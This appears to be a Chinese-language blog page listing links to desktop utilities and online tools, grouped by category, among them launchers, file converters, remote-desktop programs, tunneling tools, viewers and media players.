<h3 id="快捷启动"><a href="#快捷启动" class="headerlink" title="快捷启动"></a>快捷启动</h3><p><a href="http://www.launchy.net/" target="_blank" rel="noopener">Launchy</a><br><a href="http://hp.vector.co.jp/authors/VA018351/claunch.html" target="_blank" rel="noopener">CLaunch</a><br><a href="https://www.stardock.com/products/fences/" target="_blank" rel="noopener">Fences</a><br><a href="https://www.coodesker.com/" target="_blank" rel="noopener">Coodesker</a><br><a href="http://www.truelaunchbar.com/" target="_blank" rel="noopener">True Launch Bar</a><br><a href="https://blog.arae.cc/post/25830.html" target="_blank" rel="noopener">Maya</a><br><a href="https://github.com/hui-Zz/RunAny" target="_blank" rel="noopener">RunAny</a><br><a href="https://getrolan.com/" target="_blank" rel="noopener">Rolan</a><br><a href="https://github.com/yingDev/WGestures" target="_blank" rel="noopener">WGestures</a><br><a href="https://getquicker.net/" target="_blank" rel="noopener">Quicker</a><br><a href="https://shuax.com/project/mouseinc/" target="_blank" rel="noopener">MouseInc</a><br><a href="https://github.com/poerin/Stroke" target="_blank" rel="noopener">Stroke</a><br><a href="https://github.com/vhanla/winxcorners/" target="_blank" rel="noopener">WinXcorners</a><br><a href="https://github.com/majorworld/Grid" target="_blank" rel="noopener">Grid</a><br><a href="https://github.com/majorworld/Wheel" target="_blank" rel="noopener">Wheel</a>  </p>
<h3 id="键盘指示"><a href="#键盘指示" class="headerlink" title="键盘指示"></a>键盘指示</h3><p><a href="https://github.com/File-New-Project/EarTrumpet" target="_blank" rel="noopener">EarTrumpet</a><br><a href="https://github.com/ModernFlyouts-Community/ModernFlyouts" target="_blank" rel="noopener">ModernFlyouts</a>  </p>
<h3 id="浮动窗口"><a href="#浮动窗口" class="headerlink" title="浮动窗口"></a>浮动窗口</h3><p><a href="https://github.com/kamranahmedse/pennywise" target="_blank" rel="noopener">Pennywise</a><br><a href="https://github.com/LionelJouin/PiP-Tool" target="_blank" rel="noopener">PiP-Tool</a>  </p>
<h3 id="格式转换"><a href="#格式转换" class="headerlink" title="格式转换"></a>格式转换</h3><p><a href="https://carbon.now.sh/" target="_blank" rel="noopener">Carbon</a><br><a href="https://xiaomark.com/" target="_blank" rel="noopener">小码短链接</a><br><a href="https://docsmall.com/" target="_blank" rel="noopener">docsmall</a><br><a href="https://delim.co/" target="_blank" rel="noopener">Delim.co - Free Comma Delimiter</a><br><a href="https://sheet2api.com/tools/wiki-api/" target="_blank" rel="noopener">sheet2api</a><br><a href="https://github.com/PrivateBin/PrivateBin" target="_blank" rel="noopener">PrivateBin</a>  </p>
<h4 id="文字"><a href="#文字" class="headerlink" title="文字"></a>文字</h4><p><a href="http://hi.pcmoe.net/" target="_blank" rel="noopener">与熊论道</a><br><a href="http://www.mytju.com/classcode/tools/messycoderecover.asp" target="_blank" rel="noopener">乱码恢复</a>  </p>
<h4 id="图表"><a href="#图表" class="headerlink" title="图表"></a>图表</h4><h5 id="数据可视化"><a href="#数据可视化" class="headerlink" title="数据可视化"></a>数据可视化</h5><p><a href="https://chartcube.alipay.com/" target="_blank" rel="noopener">ChartCube</a><br><a href="https://tushuo.baidu.com/" target="_blank" rel="noopener">图说</a><br><a href="https://vega.github.io/vega-lite/" target="_blank" rel="noopener">Vega-Lite</a><br><a href="https://flourish.studio/" target="_blank" rel="noopener">Flourish</a><br><a href="https://github.com/facontidavide/PlotJuggler" target="_blank" rel="noopener">PlotJuggler</a><br><a href="https://github.com/przemek83/volbx" target="_blank" rel="noopener">Volbx</a><br><a href="https://datavizcatalogue.com/" target="_blank" rel="noopener">The Data Visualisation Catalogue</a>  </p>
<h4 id="文档"><a href="#文档" class="headerlink" title="文档"></a>文档</h4><p><a href="https://selectpdf.com/" target="_blank" rel="noopener">SelectPDF</a><br><a href="https://lib.presenta.cc/" target="_blank" rel="noopener">PRESENTA Lib</a>  </p>
<h4 id="图像"><a href="#图像" class="headerlink" title="图像"></a>图像</h4><p><a href="https://css-ig.net/pingo" target="_blank" rel="noopener">pingo</a><br><a href="https://renzhezhilu.github.io/webp2jpg-online/" target="_blank" rel="noopener">webp2jpg</a><br><a href="http://waifu2x.udp.jp/" target="_blank" rel="noopener">waifu2x</a><br><a href="https://github.com/AaronFeng753/Waifu2x-Extension-GUI" target="_blank" rel="noopener">Waifu2x-Extension-GUI</a><br><a href="https://icons8.com/upscaler" target="_blank" rel="noopener">Smart Upscaler</a><br><a href="https://www.visioncortex.org/vtracer/" target="_blank" rel="noopener">VTracer</a><br><a href="https://ascii-generator.site/" target="_blank" rel="noopener">ASCII-Generator</a><br><a href="https://github.com/alyssaxuu/animockup" target="_blank" rel="noopener">Animockup</a>  </p>
<h4 id="音频"><a href="#音频" class="headerlink" title="音频"></a>音频</h4><p><a href="https://astrofox.io/" target="_blank" rel="noopener">Astrofox</a>  </p>
<h4 id="视频"><a href="#视频" class="headerlink" title="视频"></a>视频</h4><h4 id="多种转换"><a href="#多种转换" class="headerlink" title="多种转换"></a>多种转换</h4><p><a href="https://zh.pickfrom.net/" target="_blank" rel="noopener">PickFrom</a><br><a href="http://www.alltoall.net/" target="_blank" rel="noopener">在线格式转换 All2All</a><br><a href="https://www.onlineconverter.com/" target="_blank" rel="noopener">Online Converter</a><br><a href="https://cloudconvert.com/" target="_blank" rel="noopener">CloudConvert</a><br><a href="https://convertio.co/" target="_blank" rel="noopener">Convertio</a><br><a href="https://www.online-convert.com/" target="_blank" rel="noopener">Online-Convert</a><br><a href="https://www.conversion-tool.com/" target="_blank" rel="noopener">Conversion-Tool</a><br><a href="https://anyconv.com/" target="_blank" rel="noopener">AnyConv</a><br><a href="https://www.aspose.app/" target="_blank" rel="noopener">Aspose</a><br><a href="https://www.aconvert.com/" target="_blank" rel="noopener">Aconvert</a>  </p>
<h3 id="剪贴板管理"><a href="#剪贴板管理" class="headerlink" title="剪贴板管理"></a>剪贴板管理</h3><p><a href="https://ditto-cp.sourceforge.io/" target="_blank" rel="noopener">Ditto</a><br><a href="https://hluk.github.io/CopyQ/" target="_blank" rel="noopener">CopyQ</a><br><a href="https://www.rainclip.net/" target="_blank" rel="noopener">RainClip</a><br><a href="https://snatch.kasper.io/" target="_blank" rel="noopener">Snatch</a>  </p>
<h3 id="文件传输"><a href="#文件传输" class="headerlink" title="文件传输"></a>文件传输</h3><p><a href="https://github.com/schollz/croc" target="_blank" rel="noopener">croc</a><br><a href="https://blaze.now.sh/" target="_blank" rel="noopener">Blaze</a><br><a href="https://freefilesync.org/" target="_blank" rel="noopener">FreeFileSync</a><br><a href="https://github.com/a-wing/filegogo" target="_blank" rel="noopener">filegogo</a><br><a href="https://snapdrop.net/" target="_blank" rel="noopener">Snapdrop</a><br><a href="https://www.ppzhilian.com/" target="_blank" rel="noopener">皮皮直连</a><br><a href="https://deershare.com/" target="_blank" rel="noopener">小鹿快传</a>  </p>
<h3 id="文件共享"><a href="#文件共享" class="headerlink" title="文件共享"></a>文件共享</h3><p><a href="http://iscute.cn/chfs" target="_blank" rel="noopener">CuteHttpFileServer/chfs</a><br><a href="http://www.rejetto.com/hfs/" target="_blank" rel="noopener">HFS ~ Http File Server</a><br><a href="https://github.com/svenstaro/miniserve" target="_blank" rel="noopener">miniserve</a>  </p>
<h3 id="屏幕共享"><a href="#屏幕共享" class="headerlink" title="屏幕共享"></a>屏幕共享</h3><p><a href="https://github.com/pavlobu/deskreen" target="_blank" rel="noopener">Deskreen</a>  </p>
<h3 id="远程控制"><a href="#远程控制" class="headerlink" title="远程控制"></a>远程控制</h3><p><a href="https://im.qq.com/" target="_blank" rel="noopener">QQ</a><br><a href="https://support.microsoft.com/en-us/windows/how-to-use-remote-desktop-5fe128d5-8fb1-7a23-3b8a-41e636865e8c" target="_blank" rel="noopener">Remote Desktop</a><br><a href="https://remotedesktop.google.com/" target="_blank" rel="noopener">Google Remote Desktop</a><br><a href="https://github.com/FreeRDP/FreeRDP" target="_blank" rel="noopener">FreeRDP</a><br><a href="https://www.teamviewer.com/" target="_blank" rel="noopener">TeamViewer</a><br><a href="https://sunlogin.oray.com/" target="_blank" rel="noopener">向日葵</a><br><a href="https://www.todesk.com/" target="_blank" rel="noopener">ToDesk</a><br><a href="https://anydesk.com/" target="_blank" rel="noopener">AnyDesk</a><br><a href="https://parsec.app/" target="_blank" rel="noopener">Parsec</a><br><a href="https://moonlight-stream.org/" target="_blank" rel="noopener">Moonlight</a><br><a href="https://www.shenzhuohl.com/xiezhu.html" target="_blank" rel="noopener">Wangooe</a><br><a href="https://www.splashtop.com/" target="_blank" rel="noopener">Splashtop</a><br><a href="https://www.realvnc.com/connect/" target="_blank" rel="noopener">VNC Connect</a><br><a href="https://wayk.devolutions.net/" target="_blank" rel="noopener">Wayk</a><br><a href="http://iheyfox.cn/" target="_blank" rel="noopener">HeyFox</a>  </p>
<h3 id="电脑控制手机"><a href="#电脑控制手机" class="headerlink" title="电脑控制手机"></a>电脑控制手机</h3><p><a href="https://anl.ink/" target="_blank" rel="noopener">AnLink</a><br><a href="https://github.com/Genymobile/scrcpy" target="_blank" rel="noopener">scrcpy</a>  </p>
<h3 id="临时"><a href="#临时" class="headerlink" title="临时"></a>临时</h3><p><a href="http://z-sms.com/" target="_blank" rel="noopener">在线云短信——Z-SMS</a><br><a href="http://24mail.chacuo.net/" target="_blank" rel="noopener">临时邮箱——查错网</a><br><a href="https://temp-mail.org/" target="_blank" rel="noopener">Temp Mail</a><br><a href="https://github.com/sdushantha/tmpmail" target="_blank" rel="noopener">tmpmail</a>  </p>
<h3 id="模型展示"><a href="#模型展示" class="headerlink" title="模型展示"></a>模型展示</h3><p><a href="https://dimmy.club/" target="_blank" rel="noopener">Dimmy.club</a><br><a href="https://browserframe.com/" target="_blank" rel="noopener">BrowserFrame</a><br><a href="https://www.3dmodelscc0.com/" target="_blank" rel="noopener">3D Models CC0</a>  </p>
<h3 id="建模-1"><a href="#建模-1" class="headerlink" title="建模"></a>建模</h3><p><a href="https://planner5d.com/" target="_blank" rel="noopener">Planner5D</a>  </p>
<h3 id="建站"><a href="#建站" class="headerlink" title="建站"></a>建站</h3><p><a href="https://aspect.app/" target="_blank" rel="noopener">Aspect - The fastest way to make a website</a><br><a href="http://io.nainor.com/h5_visible" target="_blank" rel="noopener">HS-Dooring</a><br><a href="https://www.budibase.com/" target="_blank" rel="noopener">Budibase</a><br><a href="https://github.com/ly525/luban-h5" target="_blank" rel="noopener">鲁班 H5</a>  </p>
<h3 id="集合"><a href="#集合" class="headerlink" title="集合"></a>集合</h3><p><a href="https://nodesign.dev/" target="_blank" rel="noopener">NoDesign.dev</a><br><a href="https://www.toolfk.com/" target="_blank" rel="noopener">TOOLFK - 程序员开发工具</a><br><a href="https://www.tooleyes.com/" target="_blank" rel="noopener">ToolEyes</a><br><a href="http://www.nicetool.net/" target="_blank" rel="noopener">NiceTool</a><br><a href="https://tools.miku.ac/" target="_blank" rel="noopener">MikuTools</a><br><a href="https://goonlinetools.com/" target="_blank" rel="noopener">GoOnlineTools</a><br><a href="https://webbrowsertools.com/" target="_blank" rel="noopener">WebBrowserTools</a><br><a href="https://pinetools.com/" target="_blank" rel="noopener">PineTools</a><br><a href="http://www.sciweavers.org/" target="_blank" rel="noopener">SciWeavers</a>  </p>
<h4 id="开发"><a href="#开发" class="headerlink" title="开发"></a>开发</h4><p><a href="http://www.box3.cn/index.html" target="_blank" rel="noopener">开发工具箱</a><br><a href="https://codebeautify.org/" target="_blank" rel="noopener">Code Beautify</a><br><a href="https://www.freeformatter.com/" target="_blank" rel="noopener">FreeFormatter</a><br><a href="https://www.danstools.com/" target="_blank" rel="noopener">Dan’s Tools</a>  </p>
<h3 id="计算器"><a href="#计算器" class="headerlink" title="计算器"></a>计算器</h3><p><a href="https://www.99cankao.com/" target="_blank" rel="noopener">九九参考计算网</a><br><a href="http://www.ab126.com/" target="_blank" rel="noopener">懒人在线计算器</a>  </p>
<h3 id="编辑器"><a href="#编辑器" class="headerlink" title="编辑器"></a>编辑器</h3><p><a href="https://www.draw.io/" target="_blank" rel="noopener">draw.io</a><br><a href="https://www.processon.com/" target="_blank" rel="noopener">ProcessOn</a><br><a href="https://useparsr.com/" target="_blank" rel="noopener">Parsr</a><br><a href="https://github.com/siyuan-note/siyuan" target="_blank" rel="noopener">思源笔记</a><br><a href="https://wireflow.co/" target="_blank" rel="noopener">Wireflow</a><br><a href="https://typora.io/" target="_blank" rel="noopener">Typora</a><br><a href="https://www.rizonesoft.com/downloads/notepad3/" target="_blank" rel="noopener">Notepad3</a><br><a href="https://github.com/Vanessa219/vditor" target="_blank" rel="noopener">Vditor</a><br><a href="https://github.com/vnotex/vnote" target="_blank" rel="noopener">vnote</a><br><a href="https://www.notion.so/" target="_blank" rel="noopener">Notion</a><br><a href="https://dillinger.io/" target="_blank" rel="noopener">Online Markdown Editor - Dillinger</a><br><a href="https://markdownapp.now.sh/" target="_blank" rel="noopener">Markdown Editor</a><br><a href="https://www.mdnice.com/" target="_blank" rel="noopener">Markdown Nice</a><br><a href="https://github.com/taniarascia/takenote" target="_blank" rel="noopener">TakeNote</a><br><a href="https://www.athinkthings.com/note/" target="_blank" rel="noopener">小筑笔记</a><br><a href="https://dynalist.io/" target="_blank" rel="noopener">Dynalist</a><br><a href="https://joplinapp.org/" target="_blank" rel="noopener">Joplin</a><br><a href="https://online.visualstudio.com/" target="_blank" rel="noopener">Visual Studio Online</a><br><a href="https://excalidraw.com/" target="_blank" rel="noopener">Excalidraw</a><br><a href="https://whiteboard.microsoft.com/" target="_blank" rel="noopener">Microsoft Whiteboard</a><br><a href="https://sqliteonline.com/" target="_blank" rel="noopener">SQL Online IDE</a><br><a href="https://nodes.io/" target="_blank" rel="noopener">Nodes</a>  </p>
<h4 id="Markdown"><a href="#Markdown" class="headerlink" title="Markdown"></a>Markdown</h4><p><a href="https://gridea.dev/" target="_blank" rel="noopener">Gridea</a><br><a href="https://github.com/wereturtle/ghostwriter" target="_blank" rel="noopener">ghostwriter</a><br><a href="https://github.com/redsolver/noteless" target="_blank" rel="noopener">Noteless</a>  </p>
<h4 id="流程图"><a href="#流程图" class="headerlink" title="流程图"></a>流程图</h4><p><a href="https://github.com/imgcook/imove" target="_blank" rel="noopener">iMove</a>  </p>
<h3 id="排版"><a href="#排版" class="headerlink" title="排版"></a>排版</h3><p><a href="https://www.w3.org/TR/clreq/" target="_blank" rel="noopener">W3C Working Draft</a>  </p>
<h4 id="色彩换算"><a href="#色彩换算" class="headerlink" title="色彩换算"></a>色彩换算</h4><p><a href="https://easyrgb.com/en/convert.php" target="_blank" rel="noopener">EasyRGB</a><br><a href="https://www.colorhexa.com/" target="_blank" rel="noopener">ColorHexa</a><br><a href="https://www.nixsensor.com/free-color-converter/" target="_blank" rel="noopener">nix Color Sensor</a><br><a href="https://www.pantonecn.com/color-finder" target="_blank" rel="noopener">Pantone</a>  </p>
<h4 id="取色"><a href="#取色" class="headerlink" title="取色"></a>取色</h4><p><a href="https://www.colorcodepicker.com/" target="_blank" rel="noopener">Image Color Picker</a><br><a href="https://image-color.com/" target="_blank" rel="noopener">Image Color</a><br><a href="https://image-color-picker.com/" target="_blank" rel="noopener">Image Color Picker</a><br><a href="https://html-color-codes.info/" target="_blank" rel="noopener">HTML Color Codes</a><br><a href="https://imagelr.com/" target="_blank" rel="noopener">ImageLR</a><br><a href="https://imagecolorpicker.online/" target="_blank" rel="noopener">ImageColorPicker.online</a>  </p>
<h4 id="调色板"><a href="#调色板" class="headerlink" title="调色板"></a>调色板</h4><p><a href="https://color.adobe.com/zh/create/color-wheel" target="_blank" rel="noopener">Adobe Color</a><br><a href="https://www.materialui.co/color-picker" target="_blank" rel="noopener">Material UI</a><br><a href="https://www.materialpalette.com/" target="_blank" rel="noopener">Material Design Palette</a>  </p>
<h3 id="模拟器-1"><a href="#模拟器-1" class="headerlink" title="模拟器"></a>模拟器</h3><p><a href="https://www.winehq.org/" target="_blank" rel="noopener">Wine</a><br><a href="https://github.com/Fmstrat/winapps" target="_blank" rel="noopener">WinApps</a><br><a href="https://anbox.io/" target="_blank" rel="noopener">Anbox</a><br><a href="http://www.darlinghq.org/" target="_blank" rel="noopener">Darling</a><br><a href="https://github.com/copy/v86" target="_blank" rel="noopener">v86</a><br><a href="https://github.com/sickcodes/Docker-OSX" target="_blank" rel="noopener">Docker-OSX</a><br><a href="http://www.vmos.cn/" target="_blank" rel="noopener">VMOS</a><br><a href="https://github.com/ShizukuIchi/winXP" target="_blank" rel="noopener">WinXP</a><br><a href="https://ruffle.rs/" target="_blank" rel="noopener">Ruffle</a>  </p>
<h3 id="电路"><a href="#电路" class="headerlink" title="电路"></a>电路</h3><p><a href="https://wavedrom.com/editor.html" target="_blank" rel="noopener">WaveDrom Editor</a><br><a href="https://hgcserver.gitee.io/tools/CircuitJS1/circuitjs.html" target="_blank" rel="noopener">CircuitJS</a>  </p>
<h3 id="虚拟机"><a href="#虚拟机" class="headerlink" title="虚拟机"></a>虚拟机</h3><p><a href="https://www.virtualbox.org/" target="_blank" rel="noopener">VirtualBox</a><br><a href="https://www.qemu.org/" target="_blank" rel="noopener">QEMU</a><br><a href="https://github.com/sandboxie/sandboxie" target="_blank" rel="noopener">Sandboxie</a>  </p>
<h3 id="包管理器"><a href="#包管理器" class="headerlink" title="包管理器"></a>包管理器</h3><p><a href="https://github.com/microsoft/winget-pkgs" target="_blank" rel="noopener">Windows Package Manager</a><br><a href="https://winstall.app/" target="_blank" rel="noopener">winstall</a>  </p>
<h3 id="装机维护"><a href="#装机维护" class="headerlink" title="装机维护"></a>装机维护</h3><p><a href="http://www.wepe.com.cn/" target="_blank" rel="noopener">微PE</a><br><a href="http://www.firpe.cn/" target="_blank" rel="noopener">FirPE</a><br><a href="https://rufus.ie/" target="_blank" rel="noopener">Rufus</a><br><a href="https://www.ventoy.net/" target="_blank" rel="noopener">Ventoy</a><br><a href="https://cn.ultraiso.net/" target="_blank" rel="noopener">UltraISO</a><br><a href="https://www.microsoft.com/en-us/software-download/windows10" target="_blank" rel="noopener">Media Creation Tool</a><br><a href="https://www.microsoft.com/zh-cn/software-download/windows10" target="_blank" rel="noopener">Media Creation Tool - 中文（下载 Windows 10）</a><br><a href="https://www.cpuid.com/softwares/cpu-z.html" target="_blank" rel="noopener">CPU-Z</a><br><a href="https://www.techpowerup.com/gpuz/" target="_blank" rel="noopener">GPU-Z</a><br><a href="https://www.aida64.com/" target="_blank" rel="noopener">AIDA64</a><br><a href="https://www.hwinfo.com/" target="_blank" rel="noopener">HWiNFO</a><br><a href="https://www.msi.com/page/afterburner" target="_blank" rel="noopener">Afterburner</a><br><a href="http://www.kbtool.cn/" target="_blank" rel="noopener">卡硬工具箱</a><br><a href="http://www.tbtool.cn/" target="_blank" rel="noopener">图吧工具箱</a><br><a href="http://www.tbtool.cc/" target="_blank" rel="noopener">图拉丁硬件检测</a><br><a href="https://openhardwaremonitor.org/" target="_blank" rel="noopener">Open Hardware Monitor</a><br><a href="https://crystalmark.info/" target="_blank" rel="noopener">Crystal Dew World</a><br><a href="https://github.com/orf/gping" target="_blank" rel="noopener">gping</a>  </p>
<h4 id="硬盘"><a href="#硬盘" class="headerlink" title="硬盘"></a>硬盘</h4><p><a href="https://www.diskgenius.cn/" target="_blank" rel="noopener">DiskGenius</a><br><a href="http://www.puransoftware.com/" target="_blank" rel="noopener">DiskFresh</a>  </p>
<h4 id="文件恢复"><a href="#文件恢复" class="headerlink" title="文件恢复"></a>文件恢复</h4><p><a href="https://www.microsoft.com/zh-cn/store/r/windows-file-recovery/9n26s50ln705" target="_blank" rel="noopener">Windows File Recovery</a><br><a href="https://www.cgsecurity.org/wiki/TestDisk" target="_blank" rel="noopener">TestDisk</a><br><a href="https://www.cgsecurity.org/wiki/PhotoRec" target="_blank" rel="noopener">PhotoRec</a>  </p>
<h3 id="内网穿透"><a href="#内网穿透" class="headerlink" title="内网穿透"></a>内网穿透</h3><p><a href="https://hsk.oray.com/" target="_blank" rel="noopener">花生壳</a><br><a href="https://github.com/fatedier/frp" target="_blank" rel="noopener">frp</a><br><a href="https://www.zerotier.com/" target="_blank" rel="noopener">ZeroTier</a><br><a href="https://github.com/txthinking/mr2" target="_blank" rel="noopener">Mr.2</a>  </p>
<h3 id="反向代理"><a href="#反向代理" class="headerlink" title="反向代理"></a>反向代理</h3><p><a href="https://nginx.org/" target="_blank" rel="noopener">nginx</a><br><a href="https://github.com/inconshreveable/ngrok" target="_blank" rel="noopener">ngrok</a>  </p>
<h3 id="服务器连接"><a href="#服务器连接" class="headerlink" title="服务器连接"></a>服务器连接</h3><p><a href="https://putty.org/" target="_blank" rel="noopener">Putty</a><br><a href="https://winscp.net/" target="_blank" rel="noopener">WinSCP</a><br><a href="http://www.hostbuf.com/" target="_blank" rel="noopener">FinalShell</a><br><a href="https://mobaxterm.mobatek.net/" target="_blank" rel="noopener">MobaXterm</a><br><a href="https://filezilla-project.org/" target="_blank" rel="noopener">FileZilla</a><br><a href="https://github.com/dushixiang/next-terminal" target="_blank" rel="noopener">Next Terminal</a>  </p>
<h3 id="Unicode"><a href="#Unicode" class="headerlink" title="Unicode"></a>Unicode</h3><p><a href="https://www.branah.com/unicode-converter" target="_blank" rel="noopener">Unicode Converter</a><br><a href="https://babelstone.co.uk/Unicode/babelmap.html" target="_blank" rel="noopener">BabelMap Online</a><br><a href="https://smalltext.io/" target="_blank" rel="noopener">Small Text</a>  </p>
<h3 id="OCR"><a href="#OCR" class="headerlink" title="OCR"></a>OCR</h3><p><a href="https://github.com/miaomiaosoft/PandaOCR" target="_blank" rel="noopener">PandaOCR</a>  </p>
<h4 id="PDF"><a href="#PDF" class="headerlink" title="PDF"></a>PDF</h4><p><a href="https://www.pdfpai.com/" target="_blank" rel="noopener">PDF派</a><br><a href="https://smallpdf.com/" target="_blank" rel="noopener">Smallpdf</a><br><a href="https://www.ilovepdf.com/" target="_blank" rel="noopener">ILovePDF</a><br><a href="https://www.pdf2go.com/" target="_blank" rel="noopener">PDF2GO</a><br><a href="https://www.pdffiller.com/" target="_blank" rel="noopener">pdfFiller</a><br><a href="https://www.cutepdf-editor.com/" target="_blank" rel="noopener">CutePDF</a><br><a href="https://www.sejda.com/" target="_blank" rel="noopener">Sejda</a><br><a href="https://www.goodannotations.com/tools/draw-on-pdf" target="_blank" rel="noopener">Draw On PDF | Good Annotations</a><br><a href="https://www.cnblogs.com/pdfpatcher/" target="_blank" rel="noopener">PDF补丁丁</a>  </p>
<h3 id="压缩文件"><a href="#压缩文件" class="headerlink" title="压缩文件"></a>压缩文件</h3><p><a href="https://www.7-zip.org/" target="_blank" rel="noopener">7-Zip</a><br><a href="https://peazip.github.io/" target="_blank" rel="noopener">PeaZip</a><br><a href="https://www.bandisoft.com/bandizip/" target="_blank" rel="noopener">Bandizip</a>  </p>
<h3 id="对比不同"><a href="#对比不同" class="headerlink" title="对比不同"></a>对比不同</h3><p><a href="https://winmerge.org/" target="_blank" rel="noopener">WinMerge</a><br><a href="http://www.scootersoftware.com/" target="_blank" rel="noopener">Beyond Compare</a><br><a href="https://www.truehumandesign.se/s_diffinity.php" target="_blank" rel="noopener">Diffinity</a>  </p>
<h4 id="图"><a href="#图" class="headerlink" title="图"></a>图</h4><p><a href="https://github.com/dmtrKovalenko/odiff" target="_blank" rel="noopener">Odiff</a><br><a href="https://github.com/n7olkachev/imgdiff" target="_blank" rel="noopener">imgdiff</a>  </p>
<h3 id="截图录像"><a href="#截图录像" class="headerlink" title="截图录像"></a>截图录像</h3><p><a href="https://github.com/ShareX/ShareX" target="_blank" rel="noopener">ShareX</a><br><a href="https://github.com/NickeManarin/ScreenToGif" target="_blank" rel="noopener">ScreenToGif</a><br><a href="https://zh.snipaste.com/" target="_blank" rel="noopener">Snipaste</a><br><a href="https://github.com/MathewSachin/Captura/" target="_blank" rel="noopener">Captura</a><br><a href="https://www.screenbits.com/" target="_blank" rel="noopener">Screenbits</a><br><a href="https://www.cockos.com/licecap/" target="_blank" rel="noopener">LICEcap</a>  </p>
<h3 id="在线文档"><a href="#在线文档" class="headerlink" title="在线文档"></a>在线文档</h3><p><a href="https://www.onlinedocumentviewer.com/" target="_blank" rel="noopener">Online Document Viewer</a><br><a href="https://online.foxitsoftware.com/reader/" target="_blank" rel="noopener">Foxit Reader Online</a><br><a href="https://viewer.autodesk.com/" target="_blank" rel="noopener">Autodesk Viewer</a>  </p>
<h4 id="特定格式"><a href="#特定格式" class="headerlink" title="特定格式"></a>特定格式</h4><p><a href="https://psviewer.org/onlineviewer.aspx" target="_blank" rel="noopener">PS(PostScript) Viewer</a><br><a href="https://cdrviewer.org/onlineviewer.aspx" target="_blank" rel="noopener">CDR Viewer</a><br><a href="https://viewer.openhdr.org/" target="_blank" rel="noopener">OpenHDR Viewer</a><br><a href="https://www.pcbgogo.com/GerberViewer.html" target="_blank" rel="noopener">Online Gerber Viewer(PCB)</a><br><a href="http://labelary.com/viewer.html" target="_blank" rel="noopener">Labelary Online ZPL Viewer</a><br><a href="https://www.viewstl.com/" target="_blank" rel="noopener">STL Viewer</a><br><a href="https://ddsviewer.com/onlineviewer.aspx" target="_blank" rel="noopener">DirectDraw Surface - DDS Viewer</a><br><a href="https://www.emachineshop.com/free-online-step-file-viewer/" target="_blank" rel="noopener">STEP File Viewer</a><br><a href="https://www.ofoct.com/viewer/tiff-viewer-online.html" target="_blank" rel="noopener">TIFF Viewer/Reader Online</a><br><a href="https://aiviewer.com/onlineviewer.aspx" target="_blank" rel="noopener">Ai Viewer</a><br><a href="https://ncviewer.com/" target="_blank" rel="noopener">NC Viewer</a><br><a href="https://3dviewer.net/" target="_blank" rel="noopener">Online 3D Viewer</a><br><a href="https://gallery.proficad.eu/tools/AutoCAD-Viewer.aspx" target="_blank" rel="noopener">AutoCAD Viewer</a><br><a href="https://psdviewer.org/onlineviewer.aspx" target="_blank" rel="noopener">PSD Viewer</a><br><a href="https://animaapp.github.io/sketch-web-viewer/" target="_blank" rel="noopener">Sketch Web Viewer</a><br><a href="https://www.gerber-viewer.com/" target="_blank" rel="noopener">Online Gerber-Viewer</a><br><a href="https://cr2viewer.com/onlineviewer.aspx" target="_blank" rel="noopener">CR2 Viewer</a><br><a href="https://www.onlinehexeditor.com/" target="_blank" rel="noopener">Hex Editor &amp; Viewer</a><br><a href="https://exif.tuchong.com/" target="_blank" rel="noopener">EXIF信息查看器</a>  </p>
<h3 id="画图"><a href="#画图" class="headerlink" title="画图"></a>画图</h3><p><a href="https://github.com/FreeCAD/FreeCAD" target="_blank" rel="noopener">FreeCAD</a>  </p>
<h3 id="图片浏览"><a href="#图片浏览" class="headerlink" title="图片浏览"></a>图片浏览</h3><p><a href="https://faststone.org/" target="_blank" rel="noopener">FastStone</a><br><a href="https://www.irfanview.com/" target="_blank" rel="noopener">IrfanView</a><br><a href="https://www.xnview.com/" target="_blank" rel="noopener">XnView</a><br><a href="https://imageglass.org/" target="_blank" rel="noopener">ImageGlass</a><br><a href="https://www.bandisoft.com/honeyview/" target="_blank" rel="noopener">Honeyview</a><br><a href="https://github.com/Ruben2776/PicView" target="_blank" rel="noopener">PicView</a>  </p>
<h3 id="视频播放"><a href="#视频播放" class="headerlink" title="视频播放"></a>视频播放</h3><p><a href="https://kodi.tv/" target="_blank" rel="noopener">Kodi</a><br><a href="https://www.plex.tv/" target="_blank" rel="noopener">Plex</a><br><a href="https://www.videolan.org/" target="_blank" rel="noopener">VLC Media Player</a><br><a href="https://potplayer.daum.net/" target="_blank" rel="noopener">Potplayer</a><br><a href="https://www.smplayer.info/" target="_blank" rel="noopener">SMPlayer</a><br><a href="https://mpv.io/" target="_blank" rel="noopener">MPV</a><br><a href="https://github.com/clsid2/mpc-hc" target="_blank" rel="noopener">MPC-HC</a><br><a href="https://sourceforge.net/projects/mpcbe/" target="_blank" rel="noopener">MPC-BE</a><br><a href="https://github.com/Hunlongyu/ZY-Player" target="_blank" rel="noopener">ZY Player</a>  </p>
<h3 id="音频播放"><a href="#音频播放" class="headerlink" title="音频播放"></a>音频播放</h3><p><a href="http://www.aimp.ru/" target="_blank" rel="noopener">AIMP</a><br><a href="https://www.foobar2000.org/" target="_blank" rel="noopener">foobar2000</a><br><a href="https://github.com/zhongyang219/MusicPlayer2" target="_blank" rel="noopener">MusicPlayer2</a>  </p>
<h3 id="文件搜索"><a href="#文件搜索" class="headerlink" title="文件搜索"></a>文件搜索</h3><p><a href="https://www.voidtools.com/zh-cn/" target="_blank" rel="noopener">Everything</a><br><a href="https://github.com/stnkl/EverythingToolbar" target="_blank" rel="noopener">EverythingToolbar</a><br><a href="https://www.listary.com/download" target="_blank" rel="noopener">Listary</a><br><a href="https://github.com/Wox-launcher/Wox/" target="_blank" rel="noopener">Wox</a>  </p>
<h3 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h3><p><a href="https://docs.microsoft.com/zh-cn/windows-server/administration/windows-commands/robocopy" target="_blank" rel="noopener">robocopy</a>  </p>
